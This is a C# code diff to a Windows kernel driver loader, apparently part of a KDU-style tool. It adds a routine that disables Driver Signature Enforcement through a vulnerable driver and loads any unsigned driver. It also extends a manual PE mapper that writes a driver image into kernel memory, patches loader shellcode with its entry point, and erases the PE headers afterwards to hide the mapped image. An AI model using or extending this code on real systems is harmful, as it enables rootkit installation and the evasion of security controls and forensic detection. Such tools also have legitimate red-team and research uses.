@@ -17,13 +17,20 @@ namespace KernelMode.Driver
 	public static class DriverLoader
 	{
 		private const string DrvMapService = "drvmap";
-		private const string DrvMapPath = "Drivers/drvmap.sys";
-		private const string ShellcodePath = "Drivers/scv2.bin";
+		// Assuming the program runs from the KDU root, paths are relative to the /bin folder.
+		private const string DrvMapPath = @"Drivers\drvmap.sys";
+		private const string ShellcodePath = @"Shellcode\scv2.bin";
 
 		private static KernelExportResolver _kernelExportResolver;
 
+		private struct MappedImageInfo
+		{
+			public ulong BaseAddress;
+			public ulong EntryPoint;
+		}
+
 		[StructLayout(LayoutKind.Sequential)]
-		private struct SYSTEM_MODULE_INFORMATION
+		public struct SYSTEM_MODULE_INFORMATION
 		{
 			public uint NextOffset;
 			public IntPtr Reserved1;
@@ -40,7 +47,51 @@ namespace KernelMode.Driver
 		}
 
 		[DllImport("ntdll.dll")]
-		private static extern int NtQuerySystemInformation(int infoClass, IntPtr buffer, int length, out int returnLength);
+		public static extern int NtQuerySystemInformation(int infoClass, IntPtr buffer, int length, out int returnLength);
+
+		public static void LoadUnsignedDriver()
+		{
+			IProvider provider = KernelMemory.GetProvider();
+			if (provider == null)
+			{
+				Console.WriteLine("[-] No active provider. DSE patching requires an active provider.");
+				return;
+			}
+
+			Console.Write("Enter path to unsigned .sys driver to load: ");
+			string driverPath = Console.ReadLine();
+			if (!File.Exists(driverPath))
+			{
+				Console.WriteLine("[-] Driver file not found.");
+				return;
+			}
+
+			string serviceName = Path.GetFileNameWithoutExtension(driverPath);
+
+			if (!DsePatcher.Disable(provider))
+			{
+				Console.WriteLine("[-] Failed to disable DSE. Cannot load driver.");
+				return;
+			}
+
+			Console.WriteLine($"[*] Attempting to load driver: {driverPath}");
+			if (InstallDriver(serviceName, driverPath))
+			{
+				Console.WriteLine("[+] Driver service created and started successfully.");
+				Console.WriteLine("[*] You can now interact with your driver.");
+				Console.WriteLine("[*] Press any key to stop and unload the driver.");
+				Console.ReadKey();
+				UnloadDriver(serviceName);
+				Console.WriteLine("[+] Driver unloaded.");
+			}
+			else
+			{
+				Console.WriteLine("[-] Failed to install or start the driver service.");
+			}
+
+			// Always attempt to restore DSE.
+			DsePatcher.Enable(provider);
+		}
 
 		public static void LoadMappedBin()
 		{
@@ -65,33 +116,38 @@ namespace KernelMode.Driver
 			if (provider == null)
 			{
 				Console.WriteLine("[-] No active provider.");
+				UnloadDriver(DrvMapService);
 				return;
 			}
 
 			if (!InitializeKernelExportResolver())
 			{
 				Console.WriteLine("[-] Failed to initialize kernel export resolver.");
+				UnloadDriver(DrvMapService);
 				return;
 			}
 
 			ulong shellcodeAddr = AllocateAndWrite(provider, shellcode);
-			ulong driverAddr = MapPEImage(provider, targetDriver);
+			MappedImageInfo driverInfo = MapPEImage(provider, targetDriver);
 
-			if (shellcodeAddr == 0 || driverAddr == 0)
+			if (shellcodeAddr == 0 || driverInfo.BaseAddress == 0)
 			{
 				Console.WriteLine("[-] Failed to write shellcode or driver.");
+				UnloadDriver(DrvMapService);
 				return;
 			}
 
 			Console.WriteLine("[*] Shellcode written to: 0x" + shellcodeAddr.ToString("X"));
-			Console.WriteLine("[*] Driver image written to: 0x" + driverAddr.ToString("X"));
+			Console.WriteLine("[*] Driver image written to: 0x" + driverInfo.BaseAddress.ToString("X"));
+			Console.WriteLine("[*] Driver entry point at: 0x" + driverInfo.EntryPoint.ToString("X"));
 
-			PatchShellcode(provider, shellcodeAddr, driverAddr);
+			PatchShellcode(provider, shellcodeAddr, driverInfo.BaseAddress, driverInfo.EntryPoint);
 
 			ulong drvmapBase = ResolveDrvMapBase();
 			if (drvmapBase == 0)
 			{
 				Console.WriteLine("[-] Failed to locate drvmap.sys base address.");
+				UnloadDriver(DrvMapService);
 				return;
 			}
 
@@ -99,6 +155,11 @@ namespace KernelMode.Driver
 			TriggerDrvMap(provider, shellcodeAddr, callbackPointerAddr);
 
 			Console.WriteLine("[+] Mapping attempted via drvmap");
+
+			// Final cleanup
+			UnloadDriver(DrvMapService);
+			provider.Dispose(); // This should handle unloading the vulnerable driver
+			Console.WriteLine("[+] Cleanup complete.");
 		}
 
 		private static bool InstallDriver(string serviceName, string driverPath)
@@ -106,12 +167,20 @@ namespace KernelMode.Driver
 			if (!File.Exists(driverPath)) return false;
 			Process.Start("sc", $"create {serviceName} type= kernel binPath= \"{Path.GetFullPath(driverPath)}\" start= demand").WaitForExit();
 			Process.Start("sc", $"start {serviceName}").WaitForExit();
+			// STUB: FIXME!! A more robust check would be needed here in a real application
 			return true;
 		}
 
-		private static ulong MapPEImage(IProvider provider, byte[] image)
+		private static void UnloadDriver(string serviceName)
 		{
-			ulong allocatedAddr = 0;
+			Console.WriteLine($"[*] Unloading driver service: {serviceName}");
+			Process.Start("sc", $"stop {serviceName}").WaitForExit();
+			Process.Start("sc", $"delete {serviceName}").WaitForExit();
+		}
+
+		private static MappedImageInfo MapPEImage(IProvider provider, byte[] image)
+		{
+			var result = new MappedImageInfo();
 			const ushort IMAGE_DOS_SIGNATURE = 0x5A4D;
 			const uint IMAGE_NT_SIGNATURE = 0x00004550;
 
@@ -119,7 +188,7 @@ namespace KernelMode.Driver
 			if (dosSig != IMAGE_DOS_SIGNATURE)
 			{
 				Console.WriteLine("[-] Invalid DOS signature.");
-				return allocatedAddr;
+				return result;
 			}
 
 			int peHeaderOffset = BitConverter.ToInt32(image, 0x3C);
@@ -127,16 +196,18 @@ namespace KernelMode.Driver
 			if (ntSig != IMAGE_NT_SIGNATURE)
 			{
 				Console.WriteLine("[-] Invalid NT signature.");
-				return 0;
+				return result;
 			}
 
+			int optionalHeaderOffset = peHeaderOffset + 24;
 			short numberOfSections = BitConverter.ToInt16(image, peHeaderOffset + 6);
 			int sizeOfOptionalHeader = BitConverter.ToInt16(image, peHeaderOffset + 20);
-			int sectionTableOffset = peHeaderOffset + 24 + sizeOfOptionalHeader;
-			int imageBaseOffset = peHeaderOffset + 24 + 24;
-			ulong imageBase = BitConverter.ToUInt64(image, imageBaseOffset);
+			int sectionTableOffset = optionalHeaderOffset + sizeOfOptionalHeader;
+			ulong imageBase = BitConverter.ToUInt64(image, optionalHeaderOffset + 24);
+			int sizeOfImage = BitConverter.ToInt32(image, optionalHeaderOffset + 56);
+			int entryPointRva = BitConverter.ToInt32(image, optionalHeaderOffset + 16);
+			int sizeOfHeaders = BitConverter.ToInt32(image, optionalHeaderOffset + 60);
 
-			int sizeOfImage = BitConverter.ToInt32(image, peHeaderOffset + 80);
 			byte[] fullImage = new byte[sizeOfImage];
 			Buffer.BlockCopy(image, 0, fullImage, 0, Math.Min(image.Length, sizeOfImage));
 
@@ -160,15 +231,31 @@ namespace KernelMode.Driver
 				if (provider.WriteMemory(addr, fullImage, fullImage.Length))
 				{
 					Console.WriteLine("[+] PE image mapped at 0x" + addr.ToString("X"));
-					allocatedAddr = addr;
+					result.BaseAddress = addr;
+					result.EntryPoint = addr + (ulong)entryPointRva;
 					ApplyRelocations(image, fullImage, imageBase, addr);
 					ApplyImportTable(image, fullImage);
-					return addr;
+					ErasePEHeaders(provider, addr, (uint)sizeOfHeaders);
+					return result;
 				}
 			}
 
 			Console.WriteLine("[-] Failed to map PE image.");
-			return 0;
+			return result;
+		}
+
+		private static void ErasePEHeaders(IProvider provider, ulong imageBase, uint sizeOfHeaders)
+		{
+			Console.WriteLine("[*] Erasing PE headers from mapped driver...");
+			byte[] zeros = new byte[sizeOfHeaders];
+			if (!provider.WriteMemory(imageBase, zeros, zeros.Length))
+			{
+				Console.WriteLine("[-] Failed to erase PE headers.");
+			}
+			else
+			{
+				Console.WriteLine("[+] PE headers erased.");
+			}
 		}
 
 		private static void ApplyRelocations(byte[] originalImage, byte[] mappedImage, ulong originalBase, ulong newBase)
@@ -314,19 +401,25 @@ namespace KernelMode.Driver
 			return _kernelExportResolver.Resolve(name);
 		}
 
-		private static void PatchShellcode(IProvider provider, ulong shellcodeAddr, ulong driverAddr)
+		private static void PatchShellcode(IProvider provider, ulong shellcodeAddr, ulong driverBase, ulong driverEntry)
 		{
-			byte[] patch = BitConverter.GetBytes(driverAddr);
-			// The shellcode expects the driver's mapped base address to be patched in.
-			// The exact offset depends on the shellcode being used (scv2.bin).
-			// Assuming a simple shellcode structure like:
-			// 0: mov rcx, <64-bit placeholder>
-			// 8: mov rax, <64-bit placeholder for DriverEntry>
-			// ...
-			// We are patching the first parameter (rcx), typically the image base.
-			// A common pattern is to place the value after the MOV instruction's opcode.
-			// For `mov rcx, imm64`, the value is at offset 2.
-			provider.WriteMemory(shellcodeAddr + 2, patch, patch.Length);
+			// Patches the shellcode (e.g., scv2.bin) with the necessary addresses.
+			// The shellcode expects the driver base address in RCX and the entry point in RAX.
+			// From ScV2.cs:
+			// offset 6: mov rcx, <param> (driverBase)
+			// offset 16: mov rax, <DriverEntry>
+
+			byte[] basePatch = BitConverter.GetBytes(driverBase);
+			if (!provider.WriteMemory(shellcodeAddr + 6, basePatch, basePatch.Length))
+			{
+				Console.WriteLine("[-] Failed to patch shellcode with driver base address.");
+			}
+
+			byte[] entryPatch = BitConverter.GetBytes(driverEntry);
+			if (!provider.WriteMemory(shellcodeAddr + 16, entryPatch, entryPatch.Length))
+			{
+				Console.WriteLine("[-] Failed to patch shellcode with driver entry point.");
+			}
 		}
 
 		private static ulong GetNtoskrnlBase()
